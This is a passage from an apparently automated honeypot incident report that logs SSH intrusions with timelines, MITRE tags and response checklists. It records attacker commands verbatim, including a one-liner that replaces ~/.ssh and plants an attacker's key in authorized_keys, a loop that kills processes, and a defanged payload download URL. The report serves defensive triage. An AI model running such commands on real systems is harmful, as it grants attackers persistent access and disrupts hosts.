| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 11:32:17` | `cowrie.session.connect` |
| `2026-07-29 11:32:17` | `cowrie.client.version` |
| `2026-07-29 11:32:17` | `cowrie.client.kex` |
| `2026-07-29 11:32:19` | `cowrie.login.success` |
| `2026-07-29 11:32:20` | `cowrie.direct-tcpip.request` |
| `2026-07-29 11:32:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.187.229[.]201` to AbuseIPDB if not already reported
- [ ] Block `122.187.229[.]201` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-731b5c4423d4

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-29 11:36 |
| **Last Seen** | 2026-07-29 11:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 11:36:16` | `cowrie.session.connect` |
| `2026-07-29 11:36:16` | `cowrie.client.version` |
| `2026-07-29 11:36:16` | `cowrie.client.kex` |
| `2026-07-29 11:36:17` | `cowrie.login.success` |
| `2026-07-29 11:36:18` | `cowrie.direct-tcpip.request` |
| `2026-07-29 11:36:18` | `cowrie.direct-tcpip.data` |
| `2026-07-29 11:36:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6b01318408e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]18` |
| **First Seen** | 2026-07-29 11:36 |
| **Last Seen** | 2026-07-29 11:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 11:36:16` | `cowrie.session.connect` |
| `2026-07-29 11:36:17` | `cowrie.login.success` |
| `2026-07-29 11:36:18` | `cowrie.session.params` |
| `2026-07-29 11:36:18` | `cowrie.log.closed` |
| `2026-07-29 11:36:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]18` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34287bff2314

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]18` |
| **First Seen** | 2026-07-29 11:36 |
| **Last Seen** | 2026-07-29 11:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_OK` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 11:36:19` | `cowrie.session.connect` |
| `2026-07-29 11:36:20` | `cowrie.login.success` |
| `2026-07-29 11:36:20` | `cowrie.session.params` |
| `2026-07-29 11:36:20` | `cowrie.command.input` |
| `2026-07-29 11:36:21` | `cowrie.log.closed` |
| `2026-07-29 11:36:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]18` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a17140b91db

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]18` |
| **First Seen** | 2026-07-29 11:36 |
| **Last Seen** | 2026-07-29 11:37 |
| **Session Duration** | 56s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo WRITABLE >/tmp/.testfile 2>&1, ls -l /tmp/.testfile 2>&1, rm -f /tmp/.testfile, cd /tmp, for pid in /proc/[0-9]*; do pid_num="${pid##*/}"; if [ -r "$pid/maps" ]; then suspicious=true; while IFS= read -r line; do case "$line" in *"/lib/"*|*"/lib64/"*|*".so"*) suspicious=false; break;; esac; done < "$pid/maps"; if [ "$suspicious" = true ]; then kill -9 "$pid_num" 2>/dev/null; fi; fi; done;` |
| **Download Attempts** | hxxp://91.199.133[.]133:8080/deploy.sh, hxxp://91.199.133[.]133:8080/deploy.sh, b5147693ed4a8744cd3c32e2a2b8c6ec77acc6c8f0494b994398161a0ba009c5 |
| **Malware Analysis** | 0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7 (LOW) |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1105 · T1222.002 · T1489 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 11:36:21` | `cowrie.session.connect` |
| `2026-07-29 11:36:23` | `cowrie.login.success` |
| `2026-07-29 11:36:23` | `cowrie.session.params` |
| `2026-07-29 11:36:24` | `cowrie.command.input` |
| `2026-07-29 11:36:25` | `cowrie.command.input` |
| `2026-07-29 11:36:25` | `cowrie.command.input` |
| `2026-07-29 11:36:26` | `cowrie.command.input` |
| `2026-07-29 11:36:26` | `cowrie.command.input` |
| `2026-07-29 11:36:26` | `cowrie.command.input` |
| `2026-07-29 11:36:27` | `cowrie.command.input` |
| `2026-07-29 11:36:27` | `cowrie.command.failed` |
| `2026-07-29 11:36:27` | `cowrie.command.failed` |
| `2026-07-29 11:36:27` | `cowrie.command.failed` |
| `2026-07-29 11:36:27` | `cowrie.command.failed` |
| `2026-07-29 11:36:27` | `cowrie.command.failed` |
| `2026-07-29 11:36:27` | `cowrie.command.failed` |
| `2026-07-29 11:36:27` | `cowrie.command.failed` |
| `2026-07-29 11:36:27` | `cowrie.command.failed` |
| `2026-07-29 11:36:27` | `cowrie.command.failed` |
| `2026-07-29 11:36:27` | `cowrie.command.failed` |
| `2026-07-29 11:36:27` | `cowrie.command.input` |
| `2026-07-29 11:36:27` | `cowrie.command.input` |
| `2026-07-29 11:36:27` | `cowrie.command.input` |
| `2026-07-29 11:36:27` | `cowrie.command.input` |
| `2026-07-29 11:36:27` | `cowrie.command.input` |
| `2026-07-29 11:36:27` | `cowrie.command.input` |
| `2026-07-29 11:36:27` | `cowrie.command.input` |
| `2026-07-29 11:36:27` | `cowrie.command.input` |
| `2026-07-29 11:36:27` | `cowrie.session.file_download` |
| `2026-07-29 11:36:27` | `cowrie.session.file_download.failed` |
| `2026-07-29 11:36:27` | `cowrie.session.file_download` |
| `2026-07-29 11:36:47` | `cowrie.command.input` |
| `2026-07-29 11:36:49` | `cowrie.command.input` |
| `2026-07-29 11:36:50` | `cowrie.command.input` |
| `2026-07-29 11:36:50` | `cowrie.command.input` |
| `2026-07-29 11:36:50` | `cowrie.command.input` |
| `2026-07-29 11:36:50` | `cowrie.command.input` |
| `2026-07-29 11:36:50` | `cowrie.command.input` |
| `2026-07-29 11:36:51` | `cowrie.command.input` |
| `2026-07-29 11:36:51` | `cowrie.command.input` |
| `2026-07-29 11:36:51` | `cowrie.command.input` |
| `2026-07-29 11:36:51` | `cowrie.command.input` |
| `2026-07-29 11:36:51` | `cowrie.command.failed` |
| `2026-07-29 11:36:51` | `cowrie.command.failed` |
| `2026-07-29 11:36:51` | `cowrie.command.failed` |
| `2026-07-29 11:36:51` | `cowrie.command.failed` |
| `2026-07-29 11:37:16` | `cowrie.session.input` |
| `2026-07-29 11:37:18` | `cowrie.session.file_download` |
| `2026-07-29 11:37:18` | `cowrie.session.file_download` |
| `2026-07-29 11:37:18` | `cowrie.log.closed` |
| `2026-07-29 11:37:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]18` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f6fc4129057

| Field | Detail |
|---|---|
| **Source IP** | `196.188.93[.]169` |
| **First Seen** | 2026-07-29 11:40 |
| **Last Seen** | 2026-07-29 11:40 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 11:40:49` | `cowrie.session.connect` |
| `2026-07-29 11:40:50` | `cowrie.client.version` |
| `2026-07-29 11:40:50` | `cowrie.client.kex` |
| `2026-07-29 11:40:51` | `cowrie.login.success` |
| `2026-07-29 11:40:52` | `cowrie.direct-tcpip.request` |
| `2026-07-29 11:40:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.188.93[.]169` to AbuseIPDB if not already reported
- [ ] Block `196.188.93[.]169` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-645a5591638b

| Field | Detail |
|---|---|
| **Source IP** | `223.210.27[.]53` |
| **First Seen** | 2026-07-29 11:41 |
| **Last Seen** | 2026-07-29 11:41 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 11:41:01` | `cowrie.session.connect` |
| `2026-07-29 11:41:02` | `cowrie.client.version` |
| `2026-07-29 11:41:02` | `cowrie.client.kex` |
| `2026-07-29 11:41:04` | `cowrie.login.success` |
| `2026-07-29 11:41:05` | `cowrie.direct-tcpip.request` |
| `2026-07-29 11:41:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.210.27[.]53` to AbuseIPDB if not already reported
- [ ] Block `223.210.27[.]53` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f277def14fd

| Field | Detail |
|---|---|
| **Source IP** | `180.180.232[.]242` |
| **First Seen** | 2026-07-29 11:43 |
| **Last Seen** | 2026-07-29 11:43 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 11:43:12` | `cowrie.session.connect` |
| `2026-07-29 11:43:12` | `cowrie.client.version` |
| `2026-07-29 11:43:12` | `cowrie.client.kex` |
| `2026-07-29 11:43:15` | `cowrie.login.success` |
| `2026-07-29 11:43:16` | `cowrie.direct-tcpip.request` |
| `2026-07-29 11:43:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.180.232[.]242` to AbuseIPDB if not already reported
- [ ] Block `180.180.232[.]242` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c79a89a16b0

| Field | Detail |
|---|---|
| **Source IP** | `169.211.232[.]182` |
| **First Seen** | 2026-07-29 11:43 |
| **Last Seen** | 2026-07-29 11:43 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 11:43:22` | `cowrie.session.connect` |
| `2026-07-29 11:43:23` | `cowrie.client.version` |
| `2026-07-29 11:43:23` | `cowrie.client.kex` |
| `2026-07-29 11:43:25` | `cowrie.login.success` |
| `2026-07-29 11:43:26` | `cowrie.direct-tcpip.request` |
| `2026-07-29 11:43:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `169.211.232[.]182` to AbuseIPDB if not already reported
- [ ] Block `169.211.232[.]182` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-355b5fa709be

| Field | Detail |
|---|---|
| **Source IP** | `144.225.187[.]57` |
| **First Seen** | 2026-07-29 11:47 |
| **Last Seen** | 2026-07-29 11:47 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 11:47:31` | `cowrie.session.connect` |
| `2026-07-29 11:47:31` | `cowrie.client.version` |
| `2026-07-29 11:47:31` | `cowrie.client.kex` |
| `2026-07-29 11:47:31` | `cowrie.login.success` |
| `2026-07-29 11:47:32` | `cowrie.session.params` |
| `2026-07-29 11:47:32` | `cowrie.command.input` |
| `2026-07-29 11:47:32` | `cowrie.command.failed` |
| `2026-07-29 11:47:32` | `cowrie.log.closed` |
| `2026-07-29 11:47:33` | `cowrie.session.params` |
| `2026-07-29 11:47:33` | `cowrie.command.input` |
| `2026-07-29 11:47:33` | `cowrie.session.file_download` |
| `2026-07-29 11:47:33` | `cowrie.log.closed` |
| `2026-07-29 11:47:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.225.187[.]57` to AbuseIPDB if not already reported
- [ ] Block `144.225.187[.]57` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4936bc547d0

| Field | Detail |
|---|---|
| **Source IP** | `144.225.187[.]57` |
| **First Seen** | 2026-07-29 11:47 |
| **Last Seen** | 2026-07-29 11:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 11:47:33` | `cowrie.session.connect` |
| `2026-07-29 11:47:33` | `cowrie.client.version` |
| `2026-07-29 11:47:33` | `cowrie.client.kex` |
| `2026-07-29 11:47:33` | `cowrie.login.success` |
| `2026-07-29 11:47:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.225.187[.]57` to AbuseIPDB if not already reported
- [ ] Block `144.225.187[.]57` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9922ec94867

| Field | Detail |
|---|---|
| **Source IP** | `144.225.187[.]57` |
| **First Seen** | 2026-07-29 11:47 |
| **Last Seen** | 2026-07-29 11:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 11:47:33` | `cowrie.session.connect` |
| `2026-07-29 11:47:33` | `cowrie.client.version` |
| `2026-07-29 11:47:33` | `cowrie.client.kex` |
| `2026-07-29 11:47:34` | `cowrie.login.success` |
| `2026-07-29 11:47:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.225.187[.]57` to AbuseIPDB if not already reported
- [ ] Block `144.225.187[.]57` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d89c50f49b3f

| Field | Detail |
|---|---|
| **Source IP** | `65.20.134[.]97` |
| **First Seen** | 2026-07-29 11:51 |
| **Last Seen** | 2026-07-29 11:51 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 11:51:20` | `cowrie.session.connect` |
| `2026-07-29 11:51:20` | `cowrie.client.version` |
| `2026-07-29 11:51:20` | `cowrie.client.kex` |
| `2026-07-29 11:51:22` | `cowrie.login.success` |
| `2026-07-29 11:51:22` | `cowrie.direct-tcpip.request` |
| `2026-07-29 11:51:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.134[.]97` to AbuseIPDB if not already reported
- [ ] Block `65.20.134[.]97` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8589383ad2b4

| Field | Detail |
|---|---|
| **Source IP** | `179.176.210[.]17` |
| **First Seen** | 2026-07-29 11:54 |
| **Last Seen** | 2026-07-29 11:54 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 11:54:14` | `cowrie.session.connect` |
| `2026-07-29 11:54:14` | `cowrie.client.version` |
| `2026-07-29 11:54:14` | `cowrie.client.kex` |
| `2026-07-29 11:54:15` | `cowrie.login.success` |
| `2026-07-29 11:54:16` | `cowrie.session.params` |
| `2026-07-29 11:54:16` | `cowrie.command.input` |
| `2026-07-29 11:54:16` | `cowrie.command.failed` |
| `2026-07-29 11:54:16` | `cowrie.log.closed` |
| `2026-07-29 11:54:17` | `cowrie.session.params` |
| `2026-07-29 11:54:17` | `cowrie.command.input` |
| `2026-07-29 11:54:17` | `cowrie.session.file_download` |
| `2026-07-29 11:54:17` | `cowrie.log.closed` |
| `2026-07-29 11:54:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.176.210[.]17` to AbuseIPDB if not already reported
- [ ] Block `179.176.210[.]17` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af953833db4e

| Field | Detail |
|---|---|
| **Source IP** | `179.176.210[.]17` |
| **First Seen** | 2026-07-29 11:54 |
| **Last Seen** | 2026-07-29 11:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 11:54:17` | `cowrie.session.connect` |
| `2026-07-29 11:54:17` | `cowrie.client.version` |
| `2026-07-29 11:54:17` | `cowrie.client.kex` |
| `2026-07-29 11:54:18` | `cowrie.login.success` |
| `2026-07-29 11:54:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.176.210[.]17` to AbuseIPDB if not already reported
- [ ] Block `179.176.210[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f17a597005c7

| Field | Detail |
|---|---|
| **Source IP** | `179.176.210[.]17` |
| **First Seen** | 2026-07-29 11:54 |
| **Last Seen** | 2026-07-29 11:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 11:54:18` | `cowrie.session.connect` |
| `2026-07-29 11:54:18` | `cowrie.client.version` |
| `2026-07-29 11:54:18` | `cowrie.client.kex` |
| `2026-07-29 11:54:19` | `cowrie.login.success` |
| `2026-07-29 11:54:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.176.210[.]17` to AbuseIPDB if not already reported
- [ ] Block `179.176.210[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8c661bfef69

| Field | Detail |
|---|---|
| **Source IP** | `182.75.197[.]174` |
| **First Seen** | 2026-07-29 12:02 |
| **Last Seen** | 2026-07-29 12:02 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 12:02:20` | `cowrie.session.connect` |
| `2026-07-29 12:02:20` | `cowrie.client.version` |
| `2026-07-29 12:02:20` | `cowrie.client.kex` |
| `2026-07-29 12:02:23` | `cowrie.login.success` |
| `2026-07-29 12:02:23` | `cowrie.direct-tcpip.request` |
| `2026-07-29 12:02:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.75.197[.]174` to AbuseIPDB if not already reported
- [ ] Block `182.75.197[.]174` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e8ef6ee3a82

| Field | Detail |
|---|---|
| **Source IP** | `180.76.104[.]208` |
| **First Seen** | 2026-07-29 12:02 |
| **Last Seen** | 2026-07-29 12:02 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 12:02:29` | `cowrie.session.connect` |
| `2026-07-29 12:02:30` | `cowrie.client.version` |
| `2026-07-29 12:02:30` | `cowrie.client.kex` |
| `2026-07-29 12:02:32` | `cowrie.login.success` |
| `2026-07-29 12:02:33` | `cowrie.direct-tcpip.request` |
| `2026-07-29 12:02:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.104[.]208` to AbuseIPDB if not already reported
- [ ] Block `180.76.104[.]208` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0f6f1b0dc8b

| Field | Detail |
|---|---|
| **Source IP** | `186.239.41[.]74` |
| **First Seen** | 2026-07-29 12:08 |
| **Last Seen** | 2026-07-29 12:08 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 12:08:00` | `cowrie.session.connect` |
| `2026-07-29 12:08:01` | `cowrie.client.version` |
| `2026-07-29 12:08:01` | `cowrie.client.kex` |
| `2026-07-29 12:08:02` | `cowrie.login.success` |
| `2026-07-29 12:08:03` | `cowrie.direct-tcpip.request` |
| `2026-07-29 12:08:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.239.41[.]74` to AbuseIPDB if not already reported
- [ ] Block `186.239.41[.]74` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a52b6ef16102

| Field | Detail |
|---|---|
| **Source IP** | `211.169.212[.]206` |
| **First Seen** | 2026-07-29 12:16 |
| **Last Seen** | 2026-07-29 12:16 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 12:16:41` | `cowrie.session.connect` |
| `2026-07-29 12:16:42` | `cowrie.client.version` |
| `2026-07-29 12:16:42` | `cowrie.client.kex` |
| `2026-07-29 12:16:43` | `cowrie.login.success` |
| `2026-07-29 12:16:44` | `cowrie.direct-tcpip.request` |
| `2026-07-29 12:16:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.169.212[.]206` to AbuseIPDB if not already reported
- [ ] Block `211.169.212[.]206` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8bc1e408ba93

| Field | Detail |
|---|---|
| **Source IP** | `194.187.176[.]125` |
| **First Seen** | 2026-07-29 12:16 |
| **Last Seen** | 2026-07-29 12:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0, Accept: */*, Accept-Language: en;q=0.7,en-US;q=0.3, Cache-Control: no-cache, Connection: keep-alive` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 12:16:59` | `cowrie.session.connect` |
| `2026-07-29 12:16:59` | `cowrie.login.success` |
| `2026-07-29 12:17:00` | `cowrie.session.params` |
| `2026-07-29 12:17:00` | `cowrie.command.input` |
| `2026-07-29 12:17:00` | `cowrie.command.input` |
| `2026-07-29 12:17:00` | `cowrie.command.failed` |
| `2026-07-29 12:17:00` | `cowrie.command.input` |
| `2026-07-29 12:17:00` | `cowrie.command.failed` |
| `2026-07-29 12:17:00` | `cowrie.command.input` |
| `2026-07-29 12:17:00` | `cowrie.command.failed` |
| `2026-07-29 12:17:00` | `cowrie.command.input` |
| `2026-07-29 12:17:00` | `cowrie.command.failed` |
| `2026-07-29 12:17:00` | `cowrie.command.input` |
| `2026-07-29 12:17:00` | `cowrie.command.failed` |
| `2026-07-29 12:17:00` | `cowrie.command.input` |
| `2026-07-29 12:17:00` | `cowrie.command.failed` |
| `2026-07-29 12:17:00` | `cowrie.command.input` |
| `2026-07-29 12:17:00` | `cowrie.log.closed` |
| `2026-07-29 12:17:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.187.176[.]125` to AbuseIPDB if not already reported
- [ ] Block `194.187.176[.]125` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba1623c76672

| Field | Detail |
|---|---|
